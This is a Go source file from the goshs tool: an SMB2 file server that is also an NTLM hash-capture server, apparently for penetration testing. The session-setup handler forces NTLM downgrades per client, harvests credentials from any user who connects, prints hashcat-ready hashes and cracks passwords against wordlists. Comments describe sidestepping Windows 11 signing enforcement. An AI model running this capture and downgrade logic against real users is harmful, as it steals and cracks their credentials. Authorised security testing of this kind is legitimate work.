package smbserver

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"goshs.de/goshs/v2/logger"
	"goshs.de/goshs/v2/options"
	"goshs.de/goshs/v2/webhook"
	"goshs.de/goshs/v2/ws"
)

// SMBServer is the SMB2 file server + NTLM hash capture server.
type SMBServer struct {
	IP         string
	Port       int    // default 445
	Root       string // directory to serve
	ShareName  string // advertised share name, e.g. "goshs"
	ServerName string // NetBIOS name advertised in NTLM, e.g. "GOSHS"
	Username   string // username for authentication
	Password   string // password for authentication
	Domain     string // domain for authentication
	ReadOnly   bool
	UploadOnly bool
	NoDelete   bool
	Wordlist   string // optional wordlist path for quick hash cracking
	Hub        *ws.Hub
	WebHook    *webhook.Webhook

	ln net.Listener // bound by Bind, served by Start

	serverGUID    [16]byte // random, set once at Start
	nextSessionID uint64   // server-wide session ID counter (atomic)

	sessions        sync.Map // uint64 → *smbSession; server-wide so multi-connection clients work
	clientDowngrade sync.Map // string (client IP) → NTLMDowngradeLevel; tracks per-client downgrade progress

	// newlyCreatedPaths tracks absolute local paths created (not just opened)
	// during this server run.  Used in UploadOnly mode to permit the Windows
	// "New Folder → rename" flow: Windows uses a fresh FILE_OPEN handle for the
	// rename (not the creation handle), so we track by path rather than handle.
	newlyCreatedPaths sync.Map // string (localPath) → struct{}{}

	// watches holds all pending SMB2 CHANGE_NOTIFY requests server-wide.
	// Storing them here (not per-connection) means a file operation on any
	// connection fires watches registered on any other connection — required
	// for Win11 24H2+ which uses separate TCP connections for directory
	// watching and file operations.
	watchMu     sync.Mutex
	watches     []pendingNotify
	pendingFire bool // a dir change fired before any watch was registered
}

// ── Entry point ────────────────────────────────────────────────────────────

func NewSMBServer(opts *options.Options, hub *ws.Hub, webHook *webhook.Webhook) *SMBServer {
	return &SMBServer{
		IP:         opts.IP,
		Port:       opts.SMBPort,
		Root:       opts.Webroot,
		ShareName:  opts.SMBShare,
		ServerName: strings.ToUpper(opts.SMBShare),
		Username:   opts.Username,
		Password:   opts.Password,
		Domain:     strings.ToUpper(opts.SMBDomain),
		ReadOnly:   opts.ReadOnly,
		UploadOnly: opts.UploadOnly,
		NoDelete:   opts.NoDelete,
		Wordlist:   opts.SMBWordlist,
		Hub:        hub,
		WebHook:    webHook,
	}
}

// Bind acquires the listening socket so a port conflict is reported to the
// caller synchronously instead of a serving goroutine swallowing it.
func (s *SMBServer) Bind() error {
	addr := net.JoinHostPort(s.IP, strconv.Itoa(s.Port))
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("SMB: failed to listen on %s: %w", addr, err)
	}
	s.ln = ln
	return nil
}

func (s *SMBServer) Start() {
	if _, err := rand.Read(s.serverGUID[:]); err != nil {
		logger.Fatalf("SMB: failed to generate server GUID: %v", err)
	}

	// Bind lazily if a caller did not already do so via Bind.
	if s.ln == nil {
		if err := s.Bind(); err != nil {
			logger.Fatalf("%+v", err)
		}
	}
	logger.Infof("SMB server listening on %s (\\\\%s\\%s) — hash capture active", s.ln.Addr(), s.IP, s.ShareName)

	for {
		conn, err := s.ln.Accept()
		if err != nil {
			continue
		}
		go s.handleConn(conn)
	}
}

// ── Server-wide session management ─────────────────────────────────────────
// Sessions are keyed by session ID globally so that a client using multiple
// TCP connections (smbclient, Nautilus, Windows) finds the same session.

func (s *SMBServer) getOrCreateSession(id uint64) *smbSession {
	sess := &smbSession{ID: id}
	actual, _ := s.sessions.LoadOrStore(id, sess)
	return actual.(*smbSession)
}

func (s *SMBServer) getSession(id uint64) *smbSession {
	v, ok := s.sessions.Load(id)
	if !ok {
		return nil
	}
	return v.(*smbSession)
}

func (s *SMBServer) deleteSession(id uint64) {
	s.sessions.Delete(id)
}

func (s *SMBServer) rekeySession(oldID, newID uint64) *smbSession {
	v, ok := s.sessions.LoadAndDelete(oldID)
	if !ok {
		return nil
	}
	sess := v.(*smbSession)
	sess.ID = newID
	s.sessions.Store(newID, sess)
	return sess
}

// ── Connection handler ─────────────────────────────────────────────────────

func (s *SMBServer) handleConn(conn net.Conn) {
	remote := conn.RemoteAddr().String()
	defer func() {
		if r := recover(); r != nil {
			logger.Debugf("SMB: PANIC on connection %s: %v", remote, r)
		}
		logger.Debugf("SMB: connection closed: %s", remote)
		conn.Close()
	}()

	cs := newConnState()
	cs.conn = conn
	defer cs.closeAllHandles()
	defer s.removeConnWatches(conn)
	defer func() {
		// If a Type 2 challenge was sent but the client closed the connection
		// before sending a Type 3 (e.g. Windows RST because we omitted ESS and
		// NtlmMinClientSec requires it), advance the per-client downgrade level
		// so the next reconnect attempts the next stronger protocol.
		if cs.challengePending && cs.challengeClientIP != "" {
			next := cs.challengeAttemptLevel + 1
			if next <= DowngradeNTLMv2 {
				s.clientDowngrade.Store(cs.challengeClientIP, next)
				logger.Debugf("SMB: %s closed without Type3 at downgrade=%s — advancing to %s",
					cs.challengeClientIP, cs.challengeAttemptLevel, next)
			}
		}
	}()

	for {
		// NetBIOS session message: 1 byte type + 3 bytes length
		hdr := make([]byte, 4)
		if _, err := io.ReadFull(conn, hdr); err != nil {
			logger.Debugf("SMB: read header error from %s: %v", remote, err)
			return
		}
		msgLen := int(hdr[1])<<16 | int(hdr[2])<<8 | int(hdr[3])
		if msgLen == 0 || msgLen > 16*1024*1024 {
			logger.Debugf("SMB: invalid msgLen=%d from %s", msgLen, remote)
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			logger.Debugf("SMB: read body error from %s: %v", remote, err)
			return
		}

		// Process potentially compound SMB2 request (NextCommand chaining).
		var compResp []byte
		var notifyResps [][]byte // same-conn CHANGE_NOTIFY responses deferred until after the compound
		// Related compound context: inherited by SMB2_FLAGS_RELATED_OPERATIONS requests.
		var relatedHID uint64
		var relatedTreeID uint32
		var relatedSessID uint64
		offset := 0
		for offset < len(buf) {
			if len(buf)-offset < 64 {
				break
			}
			cmdBuf := buf[offset:]
			nextCmd := int(binary.LittleEndian.Uint32(cmdBuf[20:]))
			cmd := binary.LittleEndian.Uint16(cmdBuf[12:])
			reqFlags := binary.LittleEndian.Uint32(cmdBuf[16:])

			// SMB2_FLAGS_RELATED_OPERATIONS (0x00000004): Windows 11 (24H2+) sends
			// compound requests where subsequent commands inherit the handle, tree, and
			// session from the previous response.  The sentinel value 0xFFFF...FFFF
			// signals "use value from previous response in this compound".
			if reqFlags&0x00000004 != 0 {
				patched := make([]byte, len(cmdBuf))
				copy(patched, cmdBuf)
				changed := false
				if relatedTreeID != 0 && binary.LittleEndian.Uint32(patched[36:]) == 0xFFFFFFFF {
					binary.LittleEndian.PutUint32(patched[36:], relatedTreeID)
					changed = true
				}
				if relatedSessID != 0 && binary.LittleEndian.Uint64(patched[40:]) == ^uint64(0) {
					binary.LittleEndian.PutUint64(patched[40:], relatedSessID)
					changed = true
				}
				if relatedHID != 0 {
					if fidOff := fileIDOffset(cmd); fidOff >= 0 && fidOff+16 <= len(patched) {
						if binary.LittleEndian.Uint64(patched[fidOff:]) == ^uint64(0) &&
							binary.LittleEndian.Uint64(patched[fidOff+8:]) == ^uint64(0) {
							binary.LittleEndian.PutUint64(patched[fidOff:], relatedHID)
							binary.LittleEndian.PutUint64(patched[fidOff+8:], relatedHID)
							changed = true
						}
					}
				}
				if changed {
					cmdBuf = patched
				}
			}

			resp := s.dispatch(cs, remote, cmdBuf)

			// Update related-compound context from each response so the next
			// SMB2_FLAGS_RELATED_OPERATIONS command can inherit the correct values.
			if resp != nil && len(resp) >= 64 {
				relatedTreeID = binary.LittleEndian.Uint32(resp[36:])
				relatedSessID = binary.LittleEndian.Uint64(resp[40:])
				// Volatile FileId in a CREATE response is at body[72] = resp[136].
				if cmd == SMB2_CREATE && len(resp) >= 144 &&
					binary.LittleEndian.Uint32(resp[8:]) == STATUS_SUCCESS {
					relatedHID = binary.LittleEndian.Uint64(resp[136:])
				}
			}

			if resp != nil {
				if nextCmd != 0 {
					// More commands follow: set NextCommand to 8-byte-aligned response size.
					// This MUST happen BEFORE signing so the signature covers the correct data.
					aligned := align8(len(resp))
					binary.LittleEndian.PutUint32(resp[20:], uint32(aligned))
					for len(resp) < aligned {
						resp = append(resp, 0x00)
					}
				}
				// Sign this response if the corresponding request was signed.
				if len(resp) >= 64 {
					if reqFlags&0x00000008 != 0 { // SMB2_FLAGS_SIGNED
						sessID := binary.LittleEndian.Uint64(cmdBuf[40:])
						if sess := s.getSession(sessID); sess != nil {
							sess.mu.RLock()
							sk := sess.SigningKey
							sess.mu.RUnlock()
							if len(sk) == 16 {
								SignSMB2Response(sk, resp)
							}
						}
					}
				}
				compResp = append(compResp, resp...)
			}

			// Collect any same-connection CHANGE_NOTIFY responses deferred by
			// this command (e.g. a CLOSE that fired a watch on this connection).
			// They must be sent as separate NetBIOS frames AFTER the compound
			// response so Explorer sees the correct message ordering.
			for _, n := range cs.deferredNotifies {
				nr := buildNotifyResp(n)
				if sess := s.getSession(n.sessID); sess != nil {
					sess.mu.RLock()
					sk := sess.SigningKey
					sess.mu.RUnlock()
					if len(sk) == 16 {
						SignSMB2Response(sk, nr)
					}
				}
				notifyResps = append(notifyResps, nr)
			}
			cs.deferredNotifies = cs.deferredNotifies[:0]

			if nextCmd == 0 {
				break
			}
			offset += nextCmd
		}

		if compResp != nil {
			if _, err := conn.Write(wrapNetBIOS(compResp)); err != nil {
				logger.Debugf("SMB: write error to %s: %v", remote, err)
				return
			}
		}
		// Send each deferred same-conn CHANGE_NOTIFY as its own NetBIOS frame,
		// after the compound response so the message ordering is correct.
		for _, nr := range notifyResps {
			if _, err := conn.Write(wrapNetBIOS(nr)); err != nil {
				logger.Debugf("SMB: write error (notify) to %s: %v", remote, err)
				return
			}
		}
	}
}

// ── Dispatcher ─────────────────────────────────────────────────────────────

func (s *SMBServer) dispatch(cs *connState, remoteAddr string, buf []byte) []byte {
	if len(buf) < 4 {
		return nil
	}

	// SMB1 negotiate → upgrade to SMB2
	if buf[0] == 0xFF && buf[1] == 'S' && buf[2] == 'M' && buf[3] == 'B' {
		return s.handleSMB1Negotiate(buf)
	}

	h, err := parseHdr(buf)
	if err != nil {
		return nil
	}
	switch h.Command {
	case SMB2_NEGOTIATE:
		return s.handleNegotiate(cs, h, buf)
	case SMB2_SESSION_SETUP:
		return s.handleSessionSetup(cs, h, buf, remoteAddr)
	case SMB2_LOGOFF:
		return s.handleLogoff(cs, h)
	case SMB2_TREE_CONNECT:
		return s.handleTreeConnect(cs, h, buf)
	case SMB2_TREE_DISCONNECT:
		return s.handleTreeDisconnect(cs, h)
	case SMB2_CREATE:
		return s.handleCreate(cs, h, buf)
	case SMB2_CLOSE:
		return s.handleClose(cs, h, buf)
	case SMB2_FLUSH:
		return s.handleFlush(cs, h)
	case SMB2_READ:
		return s.handleRead(cs, h, buf)
	case SMB2_WRITE:
		return s.handleWrite(cs, h, buf)
	case SMB2_LOCK:
		return s.handleLock(cs, h, buf)
	case SMB2_QUERY_DIRECTORY:
		return s.handleQueryDir(cs, h, buf)
	case SMB2_CHANGE_NOTIFY:
		return s.handleChangeNotify(cs, h)
	case SMB2_QUERY_INFO:
		return s.handleQueryInfo(cs, h, buf)
	case SMB2_SET_INFO:
		return s.handleSetInfo(cs, h, buf)
	case SMB2_IOCTL:
		return s.handleIoctl(cs, h, buf)
	case SMB2_ECHO:
		return s.handleEcho(h)
	case SMB2_CANCEL:
		// Cancel any pending CHANGE_NOTIFY with this MessageID.
		// No response to the CANCEL itself; the cancelled watch gets STATUS_CANCELLED
		// and its response is written directly to the connection.
		s.cancelGlobalWatch(h.MessageID, cs.conn)
		return nil
	default:
		return errResp(h, STATUS_NOT_IMPLEMENTED)
	}
}

// ── SMB1 → SMB2 upgrade ────────────────────────────────────────────────────

// handleSMB1Negotiate responds to an SMB1 NEGOTIATE request with an SMB2
// NEGOTIATE RESPONSE. Windows Vista+ clients will then send an SMB2 Negotiate.
func (s *SMBServer) handleSMB1Negotiate(buf []byte) []byte {
	// Build a minimal SMB2 Negotiate Response pointing the client to SMB2.
	// Use MessageID = 0 and SessionID = 0 as required for SMB1→SMB2 upgrade.
	fakeHdr := &smb2Hdr{Command: SMB2_NEGOTIATE, MessageID: 0}
	return s.buildNegotiateResp(fakeHdr)
}

// ── SMB2 Negotiate ─────────────────────────────────────────────────────────

func (s *SMBServer) handleNegotiate(cs *connState, h *smb2Hdr, buf []byte) []byte {
	// Parse client's SecurityMode (NEGOTIATE body offset 4, 2 bytes).
	// Bit 0x02 = SMB2_NEGOTIATE_SIGNING_REQUIRED: client mandates signing.
	// Windows 11 24H2+ sets this unconditionally.
	if len(buf) >= 64+6 {
		clientSecMode := le16(buf[64:], 4)
		if clientSecMode&0x0002 != 0 {
			cs.clientRequiresSigning = true
			logger.Debugf("SMB: client requires signing (SecurityMode=0x%04x)", clientSecMode)
		}
	}
	return s.buildNegotiateResp(h)
}

func (s *SMBServer) buildNegotiateResp(h *smb2Hdr) []byte {
	spnego := InitialSPNEGO()

	// Body: StructureSize(2) + SecurityMode(2) + DialectRevision(2) +
	//       NegContextCount(2) + ServerGuid(16) + Capabilities(4) +
	//       MaxTransactSize(4) + MaxReadSize(4) + MaxWriteSize(4) +
	//       SystemTime(8) + ServerStartTime(8) +
	//       SecurityBufferOffset(2) + SecurityBufferLength(2) +
	//       NegContextOffset(4) = 64 bytes
	body := make([]byte, 64+len(spnego))

	// Always advertise SMB2_NEGOTIATE_SIGNING_ENABLED (0x0001).
	// MS-SMB2 §3.2.5.2: if the bit is absent, Windows SHOULD fail the connection.
	// This applies even to anonymous shares — the bit means "signing is supported",
	// not "signing is required". Samba does the same.
	secMode := uint16(0x0001)

	putle16(body, 0, 65)               // StructureSize
	putle16(body, 2, secMode)          // SecurityMode
	putle16(body, 4, SMB2_DIALECT_210) // Dialect 2.1
	// NegContextCount = 0 at [6]
	copy(body[8:], s.serverGUID[:])              // ServerGuid
	putle32(body, 24, SMB2_GLOBAL_CAP_LARGE_MTU) // Capabilities
	putle32(body, 28, 8*1024*1024)               // MaxTransactSize 8 MB
	putle32(body, 32, 8*1024*1024)               // MaxReadSize
	putle32(body, 36, 8*1024*1024)               // MaxWriteSize
	putWinTime(body, 40, time.Now())             // SystemTime
	// ServerStartTime = 0 at [48]
	putle16(body, 56, 64+64)               // SecurityBufferOffset (after header+body)
	putle16(body, 58, uint16(len(spnego))) // SecurityBufferLength
	// NegContextOffset = 0 at [60]
	copy(body[64:], spnego)

	resp := make([]byte, 64+len(body))
	copy(resp, buildRespHdr(SMB2_NEGOTIATE, STATUS_SUCCESS, h.MessageID, 0, 0))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 SessionSetup ──────────────────────────────────────────────────────

func (s *SMBServer) handleSessionSetup(cs *connState, h *smb2Hdr, buf []byte, remoteAddr string) []byte {
	if len(buf) < 64+24 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	secBufOff := int(le16(body, 12))
	secBufLen := int(le16(body, 14))
	if secBufOff < 64 || secBufOff+secBufLen > len(buf) {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	secBlob := buf[secBufOff : secBufOff+secBufLen]

	// ── Pure anonymous: empty security blob ───────────────────────────────────
	// Some clients (older smbclient, some fuse mounts) send zero bytes.
	if len(secBlob) == 0 {
		if s.Username != "" || s.Password != "" {
			return errResp(h, STATUS_LOGON_FAILURE)
		}
		sess := s.getOrCreateSession(h.SessionID)
		sess.mu.Lock()
		sess.Authed = true
		sess.Username = "anonymous"
		sess.mu.Unlock()
		logger.Debugf("SMB: anonymous session (empty blob) from %s", remoteAddr)
		resp := s.buildSessionSetupResp(h, h.SessionID, STATUS_SUCCESS, FinalToken(), SMB2_SESSION_FLAG_IS_GUEST)
		if cs.clientRequiresSigning {
			nullKey := make([]byte, 16)
			sess.mu.Lock()
			sess.SigningKey = nullKey
			sess.mu.Unlock()
			SignSMB2Response(nullKey, resp)
		}
		return resp
	}

	ntlmToken := ExtractNTLM(secBlob)

	// ── No NTLM token: client sent SPNEGO mechTypes list only ─────────────────
	// This is the FIRST leg of the extended SPNEGO flow used by Nautilus,
	// Windows, and native smbclient. They send a NegTokenInit with only the
	// supported mechTypes list and expect us to echo back our preferred mech
	// with STATUS_MORE_PROCESSING. They will then send a real NTLM Type 1.
	if len(ntlmToken) < 8 {
		sess := s.getOrCreateSession(h.SessionID)
		_ = sess
		// Respond with our SPNEGO mechTypes so the client knows to use NTLMSSP.
		// STATUS_MORE_PROCESSING tells it to continue the exchange.
		logger.Debugf("SMB: SPNEGO mechTypes-only from %s, prompting NTLM", remoteAddr)
		return s.buildSessionSetupResp(h, h.SessionID, STATUS_MORE_PROCESSING, NegTokenRespSelectNTLM(), 0)
	}

	msgType := le32(ntlmToken, 8)
	logger.Debugf("SMB: NTLM msgType=%d sessionID=%d from %s", msgType, h.SessionID, remoteAddr)

	// Extract bare IP (without port) for per-client downgrade tracking.
	clientIP, _, _ := net.SplitHostPort(remoteAddr)
	if clientIP == "" {
		clientIP = remoteAddr
	}

	switch msgType {

	// ── Type 1: NTLM Negotiate ────────────────────────────────────────────────
	case NTLMSSP_NEGOTIATE:
		// Assign a stable session ID before we store the challenge, so that the
		// Type 3 message (which will arrive with this ID) finds the same session.
		newSessID := h.SessionID
		if newSessID == 0 {
			if cs.pendingSessionID != 0 {
				newSessID = cs.pendingSessionID
			} else {
				// Use a server-wide counter so every TCP connection gets a
				// unique session ID. Per-connection counters would produce the
				// same value (e.g. 4294967298) for every new connection, which
				// confuses clients that open multiple simultaneous connections
				// (Nautilus, Windows) and track sessions globally.
				newSessID = atomic.AddUint64(&s.nextSessionID, 1) | (1 << 32)
				cs.pendingSessionID = newSessID
			}
		}

		// Determine which downgrade level to attempt for this client.
		// We start at DowngradeNTLMv1 (weakest) and ratchet up on each reconnect
		// if the client ignores our downgrade flags.
		downgradeLevel := DowngradeNTLMv1
		if v, ok := s.clientDowngrade.Load(clientIP); ok {
			downgradeLevel = v.(NTLMDowngradeLevel)
		}
		logger.Debugf("SMB: sending Type2 to %s with downgrade=%s", clientIP, downgradeLevel)

		challenge, err := NewChallenge(s.ServerName)
		if err != nil {
			return errResp(h, STATUS_INSUFFICIENT_RESOURCES)
		}
		challenge.DowngradeLevel = downgradeLevel

		// Capture the client's Type 1 negotiate flags so BuildChallengeMessage
		// can mirror ESS back when the client requires it (Windows 10/11
		// NtlmMinClientSec has the ESS bit set and hard-RSTs if we omit it).
		if len(ntlmToken) >= 16 {
			challenge.ClientFlags = le32(ntlmToken, 12)
		}

		sess := s.getOrCreateSession(h.SessionID)
		sess.mu.Lock()
		sess.Challenge = challenge
		sess.mu.Unlock()
		if h.SessionID != newSessID {
			s.rekeySession(h.SessionID, newSessID)
		}

		ntlmType2 := challenge.BuildChallengeMessage()
		spnegoResp := ChallengeToken(ntlmType2)

		// Record the pending challenge so handleConn can advance the ratchet
		// if the client drops the connection without sending a Type 3.
		cs.challengePending = true
		cs.challengeClientIP = clientIP
		cs.challengeAttemptLevel = downgradeLevel

		logger.Debugf("SMB: sent Type2 challenge to %s (sessID=%d)", remoteAddr, newSessID)
		return s.buildSessionSetupResp(h, newSessID, STATUS_MORE_PROCESSING, spnegoResp, 0)

	// ── Type 3: NTLM Authenticate ─────────────────────────────────────────────
	case NTLMSSP_AUTH:
		// Type 3 received — client did not silently drop after our challenge.
		cs.challengePending = false

		sess := s.getOrCreateSession(h.SessionID)
		sess.mu.RLock()
		challenge := sess.Challenge
		sess.mu.RUnlock()
		if challenge == nil {
			logger.Debugf("SMB: Type3 with no challenge for sessID=%d — rejecting", h.SessionID)
			return errResp(h, STATUS_LOGON_FAILURE)
		}

		// Save the downgrade level we attempted before clearing the challenge.
		downgradeAttempted := challenge.DowngradeLevel

		captured, err := challenge.ParseAuthMessage(ntlmToken)
		if err != nil || captured == nil {
			logger.Debugf("SMB: ParseAuthMessage failed: %v", err)
			return errResp(h, STATUS_LOGON_FAILURE)
		}

		sess.mu.Lock()
		sess.Challenge = nil
		sess.mu.Unlock()
		cs.pendingSessionID = 0

		// ── Null session: empty username in Type 3 ────────────────────────────
		// Clients send this for anonymous access even after the full NTLM
		// handshake (e.g. Nautilus with no credentials, smbclient with no -U).
		if len(ntlmToken) < 24 || captured.Username == "" {
			if s.Username != "" || s.Password != "" {
				logger.Debugf("SMB: null session rejected (auth mode)")
				return errResp(h, STATUS_LOGON_FAILURE)
			}
			sess.mu.Lock()
			sess.Authed = true
			sess.Username = "anonymous"
			sess.mu.Unlock()
			logger.Debugf("SMB: null session accepted from %s", remoteAddr)
			s.broadcastNTLMEvent(captured, remoteAddr, "")
			resp := s.buildSessionSetupResp(h, h.SessionID, STATUS_SUCCESS, FinalToken(), SMB2_SESSION_FLAG_IS_GUEST)
			// Win11 (24H2+) requires the SESSION_SETUP response to be signed even
			// for null/anonymous sessions. For null NTLM, both client and server
			// compute ExportedSessionKey = all-zeros, so signing with a zero key
			// produces a verifiable signature without knowing any password.
			if cs.clientRequiresSigning {
				nullKey := make([]byte, 16)
				sess.mu.Lock()
				sess.SigningKey = nullKey
				sess.mu.Unlock()
				SignSMB2Response(nullKey, resp)
				logger.Debugf("SMB: signed null SESSION_SETUP response with zero key for Win11")
			}
			return resp
		}

		// ── Update per-client downgrade level ────────────────────────────────
		// Map the detected protocol back to a downgrade level ordinal.
		clientLevel := protocolDowngradeLevel(captured.Protocol)
		if clientLevel > downgradeAttempted {
			// Client used a stronger protocol than we tried to force.
			// Advance to the next level for the next connection from this client
			// so we gradually ratchet up until we find what the client accepts.
			nextLevel := downgradeAttempted + 1
			if nextLevel <= DowngradeNTLMv2 {
				s.clientDowngrade.Store(clientIP, nextLevel)
				logger.Debugf("SMB: %s sent %s despite downgrade=%s — next attempt will try %s",
					clientIP, captured.Protocol, downgradeAttempted, nextLevel)
			}
		} else {
			// Client accepted the downgrade (or used weaker) — reset for next time.
			s.clientDowngrade.Delete(clientIP)
		}

		// ── Capture mode: accept real credentials with IS_NULL flag ───────────
		// Win11 (24H2+) mandates signing but RSTs the connection on
		// STATUS_LOGON_FAILURE — it does not retry with anonymous/null creds.
		// Instead we accept the real-credential Type3, capture the hash, and set
		// SMB2_SESSION_FLAG_IS_NULL on the response. Per MS-SMB2 §3.2.5.3.1 the
		// IS_NULL flag tells the client to set Session.SigningRequired = FALSE,
		// bypassing the mandatory signing requirement for this session.

		// ── Hash capture — always log/broadcast before any auth decision ──────
		// Built-in list is ~100 candidates — always safe to run inline.
		crackedPassword, _ := TryCrackDefault(captured)

		s.broadcastNTLMEvent(captured, remoteAddr, crackedPassword)
		logger.Infof("SMB: captured %s hash from %s\\%s at %s",
			captured.Protocol, captured.Domain, captured.Username, remoteAddr)
		logger.Infof("SMB: hashcat (-m %s): %s", captured.HashcatMode, captured.HashcatLine)
		if crackedPassword != "" {
			logger.Infof("SMB: cracked %s\\%s — plaintext: %s", captured.Domain, captured.Username, crackedPassword)
		}

		// File wordlist can be millions of entries — run in the background so the
		// SESSION_SETUP response goes out immediately. If a match is found later
		// it is logged and broadcast as a follow-up event.
		if crackedPassword == "" && s.Wordlist != "" {
			snap := *captured // copy; captured may be mutated after this goroutine starts
			go func() {
				if pw, ok := TryCrackFile(&snap, s.Wordlist); ok {
					logger.Infof("SMB: cracked %s\\%s — plaintext: %s (wordlist)", snap.Domain, snap.Username, pw)
					s.broadcastNTLMEvent(&snap, remoteAddr, pw)
				}
			}()
		}

		// ── Credential verification ───────────────────────────────────────────
		// effectiveDomain tracks which domain string produced a valid response,
		// so we use the same one when deriving the session signing key.
		effectiveDomain := captured.Domain
		if s.Username != "" || s.Password != "" {
			// Auth mode: check username and password.
			// Do NOT check domain — clients send WORKGROUP, ".", or anything else.
			if !strings.EqualFold(captured.Username, s.Username) {
				logger.Debugf("SMB: username mismatch: got=%q expected=%q", captured.Username, s.Username)
				return errResp(h, STATUS_LOGON_FAILURE)
			}

			// Choose the appropriate verifier based on the detected protocol.
			var verified bool
			switch captured.Protocol {
			case ProtoNTLMv1, ProtoNTLMv1ESS:
				verified = NTLMv1Verify(captured, s.Password)
			default: // ProtoNTLMv2
				// Many clients (smbclient, Windows local accounts) compute
				// ResponseKeyNT with an empty UserDom. Try both domains.
				verified = NTLMv2Verify(captured, s.Password)
				if !verified && captured.Domain != "" {
					emptyCaptured := *captured
					emptyCaptured.Domain = ""
					verified = NTLMv2Verify(&emptyCaptured, s.Password)
					if verified {
						effectiveDomain = ""
					}
				}
			}
			if !verified {
				logger.Debugf("SMB: verify failed (%s) for user=%s domain=%q", captured.Protocol, captured.Username, captured.Domain)
				return errResp(h, STATUS_LOGON_FAILURE)
			}
			logger.Debugf("SMB: credentials verified (%s) for user=%s", captured.Protocol, captured.Username)
		}
		// Open mode: accept any credentials, just capture the hash.

		// Derive SMB2 session signing key before locking so the lock is brief.
		var signingKey []byte
		if s.Password != "" {
			var err error
			switch captured.Protocol {
			case ProtoNTLMv2:
				signingKey, err = DeriveNTLMv2SigningKey(
					s.Password, captured.Username, effectiveDomain,
					captured.NTProofStr, captured.EncryptedRandomSessionKey,
				)
			case ProtoNTLMv1, ProtoNTLMv1ESS:
				signingKey, err = DeriveNTLMv1SigningKey(s.Password, captured)
			}
			if err == nil && len(signingKey) == 16 {
				logger.Debugf("SMB: derived session signing key (%s) for user=%s", captured.Protocol, captured.Username)
			} else if err != nil {
				logger.Debugf("SMB: signing key derivation failed: %v", err)
				signingKey = nil
			}
		}

		sess.mu.Lock()
		sess.Authed = true
		sess.Username = captured.Username
		sess.Domain = captured.Domain
		if len(signingKey) == 16 {
			sess.SigningKey = signingKey
		}
		sess.mu.Unlock()

		spnegoFinal := FinalToken()

		// In anonymous/capture mode (no password set) we cannot derive the SMB2
		// session signing key. Mark the session as GUEST so the client sets
		// Session.SigningRequired = FALSE (MS-SMB2 §3.2.5.3.1), preventing it from
		// signing subsequent requests and expecting signed responses.
		// In auth mode (password verified) the signing key was derived above; use
		// a normal (non-guest) session so signing works correctly.
		sessFlags := uint16(0)
		if s.Password == "" {
			sessFlags = SMB2_SESSION_FLAG_IS_GUEST
		}
		resp := s.buildSessionSetupResp(h, h.SessionID, STATUS_SUCCESS, spnegoFinal, sessFlags)
		// Windows 11 (24H2+) enforces signing and requires the SESSION_SETUP success
		// response to be signed, even though the request itself is not signed (the key
		// is derived only at this point). Sign it now if we have a key; subsequent
		// requests will carry SMB2_FLAGS_SIGNED and the dispatch loop handles those.
		sess.mu.RLock()
		sk := sess.SigningKey
		sess.mu.RUnlock()
		if len(sk) == 16 {
			SignSMB2Response(sk, resp)
		}
		return resp

	default:
		logger.Debugf("SMB: unknown NTLM msgType=%d from %s", msgType, remoteAddr)
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
}

func (s *SMBServer) buildSessionSetupResp(h *smb2Hdr, sessID uint64, status uint32, spnego []byte, sessFlags uint16) []byte {
	// Body: StructureSize(2) + SessionFlags(2) + SecurityBufferOffset(2) +
	//       SecurityBufferLength(2) = 8 bytes
	body := make([]byte, 8+len(spnego))
	putle16(body, 0, 9)                   // StructureSize
	putle16(body, 2, sessFlags)           // SessionFlags
	putle16(body, 4, 64+8)                // SecurityBufferOffset
	putle16(body, 6, uint16(len(spnego))) // SecurityBufferLength
	copy(body[8:], spnego)

	resp := make([]byte, 64+len(body))
	copy(resp, buildRespHdr(SMB2_SESSION_SETUP, status, h.MessageID, 0, sessID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 Logoff ────────────────────────────────────────────────────────────

func (s *SMBServer) handleLogoff(cs *connState, h *smb2Hdr) []byte {
	s.deleteSession(h.SessionID)
	body := make([]byte, 4)
	putle16(body, 0, 4) // StructureSize
	resp := make([]byte, 64+4)
	copy(resp, buildRespHdr(SMB2_LOGOFF, STATUS_SUCCESS, h.MessageID, 0, h.SessionID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 TreeConnect ───────────────────────────────────────────────────────

func (s *SMBServer) handleTreeConnect(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+8 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	sess := s.getOrCreateSession(h.SessionID)

	sess.mu.RLock()
	authed := sess.Authed
	username := sess.Username
	sess.mu.RUnlock()

	logger.Debugf("TREE_CONNECT: session=%d user=%q authed=%v", h.SessionID, username, authed)

	if !authed {
		logger.Debugf("TREE_CONNECT: access denied for session=%d user=%q because not authenticated", h.SessionID, username)
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	pathOff := int(le16(body, 4))
	pathLen := int(le16(body, 6))
	if pathOff < 64 || pathOff+pathLen > len(buf) {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	path := fromUTF16LE(buf[pathOff : pathOff+pathLen])

	parts := strings.Split(strings.ToLower(path), "\\")
	shareName := parts[len(parts)-1]

	logger.Debugf("SMB: TREE_CONNECT: session=%d treeID=%d share=%q path=%s", h.SessionID, h.TreeID, shareName, path)

	if shareName == "ipc$" {
		logger.Debugf("SMB: TREE_CONNECT IPC$")
		treeID := cs.newTreeID()
		cs.addTree(&smbTree{ID: treeID, ShareName: "IPC$", RootPath: ""})
		logger.Infof("SMB: IPC$ connected (treeID=%d)", treeID)
		return s.buildTreeConnectResp(h, treeID, 2)
	}

	if !strings.EqualFold(shareName, s.ShareName) {
		// Windows probes several well-known system shares (e.g. "systemresources")
		// automatically — log at debug level only to avoid spurious warnings.
		logger.Debugf("SMB: unknown share %q — available: %s", shareName, s.ShareName)
		return errResp(h, STATUS_BAD_NETWORK_NAME)
	}

	treeID := cs.newTreeID()
